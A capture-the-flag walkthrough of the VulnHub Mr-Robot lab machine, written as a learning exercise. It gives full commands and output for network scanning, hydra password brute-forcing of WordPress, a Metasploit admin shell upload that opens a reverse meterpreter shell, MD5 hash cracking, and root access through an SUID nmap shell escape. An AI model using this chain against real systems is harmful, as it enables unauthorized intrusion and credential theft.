[Link to VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/)

Install the box, start it... Ok, then what... 

Let's start with the basic. We need to find an unlocked door, or an open window of some sort first in order to get in.  Let's use __the most important tool of them all__ : [nmap](https://nmap.org/). 

Now, we don't have the IP address of the machine, but we know it's on our network and IP range of the kali box.  We already have the IP address of our kali box (192.168.56.100) so let's scan this range:   (Change the IP address range to the one on your network) 

~~~
$ nmap -sn 192.168.56.0/24 
Nmap scan report for kali (192.168.56.1)
Host is up (0.00053s latency).
Nmap scan report for 192.168.56.100    <--- Current machine
Host is up (0.00046s latency).
Nmap scan report for 192.168.56.103   <--- That's new
Host is up (0.00031s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.46 seconds
~~~

Allright, let's scan the new IP address

~~~
$ nmap 192.168.56.103
Nmap scan report for 192.168.56.103
Host is up (0.00050s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

~~~

All right, so we can access the machine on port 80/443 ... https://192.168.56.103 ... Whoaa!

Well, we know the machine is serving a website now, but we don't know what's on the machine yet.

Let's use a tool named [whatweb](https://www.kali.org/tools/whatweb/) to check what we are dealing with

~~~
$ whatweb  -a 3 192.168.56.103

http://192.168.56.103 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[192.168.56.103], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]

~~~

Ok, It does not really tell us something except that it's an Apache server... Let's try something else

There are tools that scans a webserver for "interesting" files; Introducing [goBuster](https://www.kali.org/tools/gobuster/).
goBuster needs a wordlist to perform the scan. You can get one [here](https://github.com/matteo741/Gobuster/blob/main/wordlist.txt)

Now, normally, you woudn't just start a scan without adding a delay, not to raise suspicions, but since we're the network admin here...

~~~
$ gobustr dir -u http://192.168.56.103 -w ~/Desktop/wordlist.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/user/Desktop/wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/js                   (Status: 301) [Size: 233] [--> http://192.168.56.103/js/]
/images               (Status: 301) [Size: 237] [--> http://192.168.56.103/images/]
/wp-content           (Status: 301) [Size: 241] [--> http://192.168.56.103/wp-content/]
/wp-admin             (Status: 301) [Size: 239] [--> http://192.168.56.103/wp-admin/]
/wp-includes          (Status: 301) [Size: 242] [--> http://192.168.56.103/wp-includes/]
/css                  (Status: 301) [Size: 234] [--> http://192.168.56.103/css/]
/robots.txt           (Status: 200) [Size: 41]
/license.txt          (Status: 200) [Size: 309]
[..]
~~~

Interesting: we have a Wordpress website.
Let's try the admin page :  http://192.168.56.103/wp-admin/

Let's try the obvious : admin/admin

~~~
ERROR: Invalid username.
~~~

Ok admin does not exist... We don't have a username password for now... let's continue searching.

In our gobuster log, there are status 202 different for files, let's try them.  http://192.168.56.103/robots.txt

~~~
User-agent: *
fsocity.dic
key-1-of-3.txt
~~~

Hey ! We just got key 1 of 3 !  Let's save this ```ey-1-of-3.txt``` file.

What is that ```fsocity.dic``` Let's save it and open it with a text editor.

Wow, that's a big dictionary. No way I'm going through all of that. There is something up with these words. Can you spot it ?

Most of the words are lowercase, but some are Capitalized.

Let's try the first one in the admin section...

~~~
ERROR: Invalid username.
~~~

And the second one

~~~
ERROR: The password you entered for the username Elliot is incorrect.
~~~

Now would you look at that! So we know there is a user with username Elliot. Out of curriosity, do any words in that list repeat ?  Let's try to find more entry for the first one. CTRL+F 
Yeah.. there is a couple of entries for this one. And the second one too.

Let's remove all the duplicates in the file using the unix sort command with "uniq" and output the result in a new file.

~~~
$ sort fsocity.dic | uniq > fsocity.dic.uniq 
~~~

Ok now there's a lot less entries. Let's try if one of these entries is a password for the user we know to exist. For this, we'll use the power of [hydra](https://www.kali.org/tools/hydra/)

But how do we use hydra to bruteforce Wordpress? Google is your friend!  Again, most of the work is reading documentation and trying stuff.

~~~
$ hydra -l Elliot -P fsocity.dic.uniq  192.168.56.103 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=login_error'
[...]

We'll be here for a while, why not grab a cup of tea in the meantime and come back later...

[80]http-post-form] host: 192.168.56.103   login: Elliot   password: [REMOVED]
1 of 1 target successfully completed, 1 valid password found

~~~


Login and navigate, nothing interesting found...

Now in every CTF, the goal is to get root access to the machine, but we are still far from it. Even though we were able to login a an admin user of the Wordpress Website, there isn't much we can do to gain access to the actual machine.

There is a tool, well, a framework, though, that can help us find vulnerabilities on a machine: [metasploit](https://www.kali.org/tools/metasploit-framework/) 

Metasploit is HUGE to say the least. It's capabilities are insane. You can add plugins, pair it with nmap to save "loot" in a database. I highly recommand reading the doc and check out some [youtube content](https://www.youtube.com/watch?v=Keld6Wi8aZ4) on how to use it.

~~~

$ msfconsole 
msf > search wordpress

~~~
Whoa, there's a lot of stuff here to exploit Wordpress. You can do the same with ``` search drupal ``` off course. Because everyone thinks Drupal is safe... Well there is not as much stuff as for Wordpress, but there still is some!

``

All right, getting side tracked here.  Like I said earlier, we need to find a way to get access to the server itself..  If only we could get shell access to the server... 

~~~

$ msfconsole 
msf > search wordpress shell
[...] 
36  exploit/unix/webapp/wp_admin_shell_upload                2015-02-21       excellent  Yes    WordPress Admin Shell Upload

~~~
Humm... Let's try this one

~~~
$ use exploit/multi/http/wp_crop_rce 
 msf6 exploit(exploit/multi/http/wp_crop_rce) > show options
  
  
Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit
                                         .html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.58     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
 ~~~

Now, every module has its own options that we need to set before using. 

~~~
msf6 exploit(exploit/unix/webapp/wp_admin_shell_uploadd) > set USERNAME Elliot
USERNAME => Elliot
msf6 exploit(exploit/unix/webapp/wp_admin_shell_uploadd) > set PASSWORD [REMOVED]
PASSWORD => [REMOVED]
msf6 exploit(exploit/unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.56.103
RHOSTS => 192.168.56.103
msf6 exploit(exploit/unix/webapp/wp_admin_shell_upload) > set TARGETURI /wp-login.php
TARGETURI => /wp-login.php
~~~

Let's give it a try

~~~
msf6 exploit(exploit/unix/webapp/wp_admin_shell_upload) > exploit
[*] Started reverse TCP handler on 192.168.56.101:4444 
[-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress
[*] Exploit completed, but no session was created.
~~~

No dice... Don't worry, this is part of the process. Trying, failing, trying again, and again and again until it works.

~~~

$ msfconsole 
msf > search wordpress shell
36  exploit/unix/webapp/wp_admin_shell_upload                2015-02-21       excellent  Yes    WordPress Admin Shell Upload
~~~
Let's try this one

~~~
msf exploit(multi/http/wp_crop_rce) > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(unix/webapp/wp_admin_shell_upload) > show options

msf6 exploit(exploit/unix/webapp/wp_admin_shell_uploadd) > set USERNAME Elliot
USERNAME => Elliot
msf6 exploit(exploit/unix/webapp/wp_admin_shell_uploadd) > set PASSWORD [REMOVED]
PASSWORD => [REMOVED]
msf exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(exploit/unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.56.103
RHOSTS => 192.168.56.103
msf exploit(unix/webapp/wp_admin_shell_upload) > exploit
[*] Started reverse TCP handler on 192.168.0.58:4444 
[-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress
[*] Exploit completed, but no session was created.

~~~
This again, something's weird then, it's clearly a Wordpress Website.

~~~
show advanced options
[...]
   VERBOSE                  false                                                                    no        Enable detailed status messages
   WORKSPACE                                                                                         no        Specify the workspace for this module
   WPCHECK                  true                                                                     yes       Check if the website is a valid WordPress install
   WPCONTENTDIR             wp-content                                                               yes       The name of the wp-content directory
[...]

~~~
That WPCHECK is set to TRUE, let's try setting it to false.

~~~
msf exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false
WPCHECK => false
msf exploit(unix/webapp/wp_admin_shell_upload) >  exploit

[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] Authenticating with WordPress using Elliot:ER28-0652...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/ZwGIoISudz/hBTXkjhMMk.php...
[*] Sending stage (45739 bytes) to 192.168.56.103
[*] Meterpreter session 6 opened (192.168.56.1:4444 -> 192.168.56.103:50790) at 2026-04-24 14:15:11 -0400
[!] This exploit may require manual cleanup of 'hBTXkjhMMk.php' on the target
[!] This exploit may require manual cleanup of 'ZwGIoISudz.php' on the target
[!] This exploit may require manual cleanup of '../ZwGIoISudz' on the target


~~~
We've got a meterpreter shell!! Let's see where we are

~~~
meterpreter > ls
Listing: /opt/bitnami/apps/wordpress/htdocs/wp-content/plugins/ZwGIoISudz
=========================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  138   fil   2026-04-24 14:15:15 -0400  ZwGIoISudz.php
100644/rw-r--r--  1113  fil   2026-04-24 14:15:15 -0400  hBTXkjhMMk.php
~~~

Ok, so we are in the Wordpress plugin directory. normally we would need to delete these files not to leave traces, but hey, we're only playing around...

~~~
meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
~~~

Ho, right, we are in, but we do not have a TTY shell of the local system. let's spawn one with the help of python

~~~
$ shell
Process 1818 created.
Channel 0 created.

$ python -c 'import pty; pty.spawn("/bin/sh")'
$ whoami
whoami
daemon
~~~

Sweet ! Now let's try to navigate to the home directory in order to see which users are created on this machine.

~~~
cd /home/
$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot

~~~

Let's move to the robot dir then.

~~~
$ cd robot
$ ls -la 
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

~~~

Hey! We got the second key! 

~~~
$ cat key-2-of-3.txt   
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
~~~

What the hell... Ahhh right, we do not have read access to the files as we can see here 

~~~
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
~~~

But, we can read the other one.

~~~
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
~~~

As the file suggest it, it's at MD5 hashed password. Let's spawn [hashcat]

~~~
$ hashcat64 c3fcd3d76192e4007dfb496cca67e13b
hashcat (v6.2.6) starting in autodetect mode
The following 11 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash

~~~

oh Yeah, I forgot to specify which hash it should check against and a word list

~~~
$ hashcat64 c3fcd3d76192e4007dfb496cca67e13b -m 0 /usr/share/wordlist/rockyou.txt

Host memory required for this attack: 16 MB

Dictionary cache built:
* Filename..: /usr/share/wordlist/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

c3fcd3d76192e4007dfb496cca67e13b:[REMOVED]

~~~

Well, that was fast!  We now have the robot user's password. Lets try to switch user in our shell

~~~
$ su robot
su robot
Password: [REMOVED]

robot@linux:~$ 
robot@linux:~$ ls
ls
key-2-of-3.txt	password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
[REMOVED]

~~~

2 down, 1 to go! 

Now, this is the part where a struggled for a good while... I smashed my head on the keyboad a couple of times. Ran in circle, cursed a good bit.. But it's all part of the process. 
You know what they say: enjoy the proc... F*** that I'm done...




Ok I'm back again... but still stuck... after searching for a while, I decided to check what others did... turns out there is a version of nmap installed on the server that can run shell commands.

- Yeah but you didn't know what to do you looser...
- No I didn't, and I don't pretend I know everything either... We're all learning here, and It's ok !

Turns out, there is a nmap version on the machine that contains SUID bits, this allows for interactive mode to execute shell commands.

~~~
robot@linux:~$ find / -perm /u=s 2>/dev/null
find / -perm /u=s 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap   <----
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown


~~~

Let's use namp in interactive mode then


~~~
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 

nmap> !whoami
!whoami
root
! ls /root
nmap> ! ls /root
! ls /root
firstboot_done	key-3-of-3.txt

! cat /root/key-3-of-3.txt
~~~

Wow, that final flag took a while! 

Well that's it for this one, that was fun! Some stuff to study for sure !

~~~
CTRL + C
y
exit
exit
clear
~~~